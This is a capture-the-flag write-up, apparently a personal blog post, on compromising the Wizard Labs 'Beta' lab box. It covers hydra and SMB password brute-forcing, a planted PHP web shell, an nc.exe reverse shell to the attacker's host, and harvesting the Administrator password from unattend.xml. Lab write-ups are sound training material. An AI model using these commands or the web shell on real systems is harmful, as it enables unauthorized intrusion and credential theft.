---
id: 735
title: 'Wizard Labs &#8211; Beta'
date: 2019-04-17T20:47:38+01:00
author: rowbot
layout: post
guid: http://offsecnewbie.com/?p=735
permalink: /2019/04/17/wizard-labs-beta/
image: /wp-content/uploads/2019/04/beta-174x250.png
categories:
  - Wizard Labs
---
<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?w=680" alt="" class="wp-image-755" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?w=178 178w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?resize=156%2C300 156w" sizes="(max-width: 178px) 100vw, 178px" data-recalc-dims="1" /></figure>
</div>

This box lead me down a rabbit hole&#8230;damn you H4d3s. I spent a lot of time bruteforcing web panel passwords. I had bother scanning the box, nmap hung a lot of the time but eventually I got a full scan done.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?w=680" alt="" class="wp-image-756" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?w=969 969w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?resize=300%2C235 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?resize=768%2C602 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

I tried to connect to the telnet service but got kicked out 

Port 80 gave a website with no directories.

<pre class="wp-block-preformatted">No more connections are allowed to telnet server. Please try again later.Connection closed by foreign host.
</pre>

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?w=680" alt="" class="wp-image-757" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?w=691 691w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?resize=300%2C153 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

Port 3000 gave another website that revealed some user information and passwords.<figure class="wp-block-image">

<img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?w=680" alt="" class="wp-image-737" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?w=788 788w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?resize=300%2C98 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?resize=768%2C251 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> </figure> 

python code is as follows which revealed a user russel and passwords.

<pre class="wp-block-preformatted"><br />"""<br /> Just a secure password generator made by Russel T !! Used to generate passwords  mostly for file sharing protocols <br /> Contact:russel@beta.corp<br /> """<br /> import random<br /> import sys<br /> menu = """<br /> <em>_                      _</em> <br /> / <em>\   / </em> __ _ <strong>_ </strong><em>   / </em> ___  /\ \ \<br /> \ \ / _ \/ <strong>|/ /<em>)/ </em>` / </strong>/ <strong>| / /<em>\/ </em> \/  \/ / <em>\ \  </em></strong><em>/ (<strong>/ <em>/ (</em>| __ __ \/ /<em>\  / /\  / <br /> _</em>/___|___\/    __,<em>|</em></strong>/<strong><em>/_</em></strong>/__</em>_\ \/  <br />                                 Beta Corp<br /> """<br /> words = ['lollip0p','rain','summer','little','honey']<br /> end  = [1,2,3,4,5]<br /> print(menu)<br /> word = random.choice(words)<br /> num = random.choice(end)<br /> password = (word)+(str(num))<br /> print("the secure password is : {}".format(password)) </pre>

In order to generate all the random passwords I created this script

<pre class="wp-block-preformatted"><font color="#C4A000">for</font> i in {1..100}; <font color="#C4A000">do</font> <font color="#4E9A06">python</font> <u style="text-decoration-style:single">passgen.py</u> | <font color="#4E9A06">grep</font> <font color="#C4A000">"the secure password is"</font> &gt;&gt; <u style="text-decoration-style:single">out.pass</u> | <font color="#4E9A06">cut</font> -d<font color="#C4A000">" "</font> -f6 &gt;&gt; <u style="text-decoration-style:single">list.txt</u> ;<font color="#C4A000">done</font> </pre>

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?w=680" alt="" class="wp-image-739" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?w=155 155w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?resize=105%2C300 105w" sizes="(max-width: 155px) 100vw, 155px" data-recalc-dims="1" /></figure>
</div>

picking the user russel@beta.corp and also russel and the list.txt I used hydra to try to bruteforce the login at the /user login panel and the /admin login panel

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?w=680" alt="" class="wp-image-784" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?w=686 686w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?resize=300%2C145 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

<pre><font color="#4E9A06">hydra</font> -l russel@beta.corp -P <u style="text-decoration-style:single">list.txt</u> 10.1.1.15 http-post-form <font color="#C4A000">"/user/login:username=^USER^&password=^PASS^@Login=Login:Username"</font> -V -s 3000
</pre>

<pre class="wp-block-preformatted">[ATTEMPT] target 10.1.1.15 - login "russel" - pass "summer3" - 446 of 450 [child 5] (0/0)
[ATTEMPT] target 10.1.1.15 - login "russel" - pass "honey2" - 447 of 450 [child 1] (0/0)
[ATTEMPT] target 10.1.1.15 - login "russel" - pass "honey2" - 448 of 450 [child 6] (0/0)
[ATTEMPT] target 10.1.1.15 - login "russel" - pass "summer2" - 449 of 450 [child 2] (0/0)
[ATTEMPT] target 10.1.1.15 - login "russel" - pass "lollip0p4" - 450 of 450 [child 7] (0/0)
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-17 12:18:14
<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> 
</pre>

I realised there was a better way to generate the passwords

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#4E9A06">cat</font> <u style="text-decoration-style:single">pass1</u>                
lollip0p
rain
summer
little
honey
<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#C4A000">for</font> i in <font color="#75507B">$(</font><font color="#4E9A06">cat</font> <u style="text-decoration-style:single">pass1</u><font color="#75507B">)</font>; <font color="#C4A000">do</font> <font color="#4E9A06">echo</font> $i{1..5} &gt;&gt; <u style="text-decoration-style:single">output</u>;<font color="#C4A000">done</font>
<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#4E9A06">cat</font> <u style="text-decoration-style:single">output</u> 
lollip0p1 lollip0p2 lollip0p3 lollip0p4 lollip0p5
rain1 rain2 rain3 rain4 rain5
summer1 summer2 summer3 summer4 summer5
little1 little2 little3 little4 little5
honey1 honey2 honey3 honey4 honey5
<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> 
</pre>

I took a step back and looked at the nmap scan results and seem there were SMB ports open. enum4linux and smbmap revealed nothing but nmap came back and revealed 3 shares that require passwords to access.

<pre><font color="#4E9A06">nmap</font> $ip -p 445,139 <font color="#C4A000">"--script=smb-enum*"
Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: &lt;blank&gt;
|   \\10.1.1.15\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: &lt;none&gt;
|   \\10.1.1.15\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: &lt;none&gt;
|   \\10.1.1.15\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
</font>
</pre>

I used the following script to try all passwords combos

<pre class="wp-block-preformatted"><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#C4A000">for</font> i in <font color="#75507B">$(</font><font color="#4E9A06">cat</font> <u style="text-decoration-style:single">output</u><font color="#75507B">)</font>; <font color="#C4A000">do</font> <font color="#4E9A06">echo</font> $i &&  <font color="#4E9A06">smbclient</font> //$ip/admin$ -U russel $i; <font color="#C4A000">done</font>
...
session setup failed: NT_STATUS_LOGON_FAILURE
little5
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sun Sep 23 14:34:50 2018
  ..                                  D        0  Sun Sep 23 14:34:50 2018
  addins                              D        0  Tue Jul 14 05:52:31 2009
  AppCompat                           D        0  Tue Jul 14 03:37:05 2009
  AppPatch                            D        0  Tue Apr 12 03:16:01 2011
  assembly                          DSR        0  Sat Sep 22 20:55:40 2018
</pre>

username = russel  
password = little5

Using the put command in smb I added a shell exec file called webby.php and put it into c:\xampp\htdocs so I could access it.

webby.php contains  
<?php echo shell\_exec($\_GET[&#8216;cmd&#8217;]); ?> 

I get command execution

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?w=680" alt="" class="wp-image-751" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?w=610 610w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?resize=300%2C83 300w" sizes="(max-width: 610px) 100vw, 610px" data-recalc-dims="1" /></figure>
</div>

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?w=680" alt="" class="wp-image-752" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?w=718 718w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?resize=300%2C142 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

To get a nc shell I ran the following with a listener &#8211; nc -lnvp 443 :

http://10.1.1.15/webby.php?cmd=nc.exe 10.253.0.255 443 -e cmd.exe

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?w=680" alt="" class="wp-image-753" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?w=616 616w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?resize=300%2C62 300w" sizes="(max-width: 616px) 100vw, 616px" data-recalc-dims="1" /></figure>
</div>

Running through my [Win Priv](https://guide.offsecnewbie.com/privilege-escalation/windows-pe) checks reveals the admin password

<pre>C:\xampp\htdocs&gt;type c:\unattend.xml
type c:\unattend.xml
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;unattend xmlns="urn:schemas-microsoft-com:unattend"&gt;
    &lt;settings pass="windowsPE"&gt;
        &lt;component name="Microsoft-Windows-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt;
            &lt;WindowsDeploymentServices&gt;
                &lt;Login&gt;
                    &lt;WillShowUI&gt;OnError&lt;/WillShowUI&gt;
                    &lt;Credentials&gt;
                        &lt;Username&gt;Administrator&lt;/Username&gt;
                        &lt;Domain&gt;beta&lt;/Domain&gt;
                        &lt;mark>&lt;Password&gt;loveLyp4ssw0rd*!&lt;/Password&gt;&lt;/mark>
                    &lt;/Credentials&gt;
</pre>

Using smbclient logging in as Administrator I was able to capture the root flag

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbclient</font> //$ip/C$ -U administrator
Enter WORKGROUP\administrator';s password: 
</pre>

<pre>smb: \Users\Administrator\Desktop\&gt; mget root.txt 
Get file root.txt? y
getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</pre>

Fun box which felt quite OSCP like, especially when it had me down a rabbit hole of the Gogs web application.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?w=680" alt="" class="wp-image-798" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?w=349 349w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?resize=300%2C52 300w" sizes="(max-width: 349px) 100vw, 349px" data-recalc-dims="1" /><figcaption>f1f95d42573c2f3940bfae6fdba05e5a</figcaption></figure>
</div>

I tried to use the &#8220;runas&#8221; command to start a nc reverse shell as administrator but couldn&#8217;t get it working. If you did, let me know how you did it.